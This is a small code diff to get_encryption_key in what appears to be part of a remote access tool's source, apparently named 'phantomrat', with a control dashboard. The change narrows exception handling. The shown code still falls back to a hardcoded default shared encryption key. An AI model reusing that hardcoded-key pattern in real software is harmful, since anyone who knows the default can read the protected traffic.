@@ -66,8 +66,8 @@ def get_encryption_key():
             key = profile.get('encryption', {}).get('key')
             if key:
                 return str(key).encode()
-    except:
-        pass
+    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
+        print(f"[-] Could not load key from profile: {e}")
 
     # Default shared key used by the dashboard
     return b"phantomrat_32_char_encryption_key_here"
